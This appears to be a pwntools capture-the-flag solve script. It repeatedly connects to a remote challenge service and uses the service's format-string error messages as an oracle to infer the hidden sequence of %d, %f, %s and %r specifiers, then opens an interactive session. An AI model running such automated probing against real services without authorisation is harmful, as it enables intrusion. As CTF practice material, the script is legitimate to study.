#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.80.240.190 --port 4213
from pwn import *

host = args.HOST or "20.80.240.190"
port = int(args.PORT or 4213)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    return process(["python", "./chall.py"] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

Error = int
INT_ERROR: Error = 1
FLOAT_ERROR: Error = 2
NOT_ENOUGH_ERROR: Error = 3
TOO_MUCH_S_ERROR: Error = 4
TOO_MUCH_OTHER_ERROR: Error = 5
UNALLOWED_ERROR: Error = 6


def get_error(io) -> Error:
    lines = io.recvall()
    if b"not all arguments converted during string formatting" in lines:
        return NOT_ENOUGH_ERROR
    elif b"%d format" in lines:
        return INT_ERROR
    elif b"must be real number, not str" in lines:
        return FLOAT_ERROR
    elif b"Too many %s specifiers!" in lines:
        return TOO_MUCH_S_ERROR
    elif b"Too many %" in lines:
        return TOO_MUCH_OTHER_ERROR
    elif b"Unallowed format specifiers used!" in lines:
        log.critical("Whoops, unallowed")
        return UNALLOWED_ERROR
    else:
        log.critical("The lines are: " + lines)
        io.interactive()
        sys.exit()


def pretty_error(err: Error) -> str:
    if err == INT_ERROR:
        return "%d err"
    elif err == FLOAT_ERROR:
        return "%f err"
    elif err == NOT_ENOUGH_ERROR:
        return "not enough format specifiers"
    else:
        return str(err)


def guess_n(n: int) -> bool:
    io = start()

    payload = n * "%d"
    io.sendline(payload.encode())
    err = get_error(io)

    io.close()
    return err == TOO_MUCH_OTHER_ERROR


n = 200
n = 219  # Cached from re-running the script
while not guess_n(n):
    n += 1
    if n > 250:
        log.error("Got to n > 250")
n -= 1

log.success(f"Found N: {n}")
pause()

# %s %r => STRING; %d %f => NUM;

#known_stuff = []
# Cached from re-running the script
known_stuff = ['%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%s', '%f', '%s', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%s', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%s', '%s', '%f', '%d', '%s', '%f', '%s', '%s', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%s', '%f', '%s', '%s', '%d', '%f', '%s', '%d', '%s', '%s', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%s', '%s', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%s', '%d', '%f', '%s', '%d', '%f', '%s', '%d', '%s', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%s', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%s', '%f', '%s', '%d', '%s', '%f', '%d', '%s', '%f', '%s', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%s', '%s', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%s', '%f', '%s', '%d', '%f', '%d', '%f', '%s', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%s', '%f', '%d', '%f', '%s', '%s', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%s', '%d', '%s', '%s', '%s', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%s', '%d', '%f', '%d', '%s', '%f', '%s', '%d', '%f', '%s', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%d', '%s', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%s', '%s', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%s', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%s', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%s', '%s', '%d', '%f', '%s', '%d', '%s', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%f', '%s', '%s', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%d', '%s', '%s', '%f', '%s', '%d', '%f', '%d', '%f', '%s', '%s', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%s', '%d', '%f', '%d', '%s', '%f', '%s', '%d', '%s', '%s', '%f', '%s', '%s', '%d', '%s', '%f', '%s', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%d', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%f', '%d', '%s', '%f', '%d', '%f', '%d', '%s', '%s', '%s', '%s', '%s', '%f', '%d', '%f', '%d', '%f', '%s', '%d', '%f', '%s', '%s', '%s', '%s', '%s', '%d', '%s']


def swap(arr, idx1: int, idx2: int) -> None:
    temp = arr[idx1]
    arr[idx1] = arr[idx2]
    arr[idx2] = temp


def guess_payload(arr) -> Error:
    io = start()
    payload = "".join(arr)
    io.sendline(payload.encode())
    err = get_error(io)
    io.close()
    return err


class FormatCount:
    f = n - known_stuff.count("%f")
    d = n - known_stuff.count("%d")
    s = n + 1 - known_stuff.count("%s")
    r = n - known_stuff.count("%r")


current_int_specifier = "f"

while True:
    guess = (
        known_stuff
        + ["%f"]
        + ["%d"] * (FormatCount.d)
        + ["%s"] * (FormatCount.s)
        + ["%r"] * FormatCount.r
        + ["%f"] * (FormatCount.f - 1)
    )
    log.info(known_stuff)

    err = guess_payload(guess)
    # Ugly code follows. Don't judge. :)
    if err == FLOAT_ERROR:
        if FormatCount.s > 0:
            known_stuff.append("%s")
            FormatCount.s -= 1
        elif FormatCount.r > 0:
            known_stuff.append("%r")
            FormatCount.r -= 1
        else:
            log.critical("We have a problem... Let's hope for the best")
            io = start()
            payload = "".join(
                known_stuff + ["%f"] * FormatCount.f + ["%d"] * FormatCount.d
            )
            log.critical(known_stuff)
            io.sendline(payload.encode())
            io.interactive()
    elif err == INT_ERROR:
        if current_int_specifier == "f" and FormatCount.f > 0:
            current_int_specifier = "d"
            known_stuff.append("%f")
            FormatCount.f -= 1
        elif FormatCount.d > 0:
            current_int_specifier = "f"
            known_stuff.append("%d")
            FormatCount.d -= 1
        else:
            log.critical("Looks good")
            io = start()
            payload = "".join(
                known_stuff + ["%r"] * FormatCount.r + ["%s"] * FormatCount.s
            )
            log.critical(known_stuff)
            io.sendline(payload.encode())
            io.interactive()
    else:
        log.critical(f"WAT: {pretty_error(err)}")
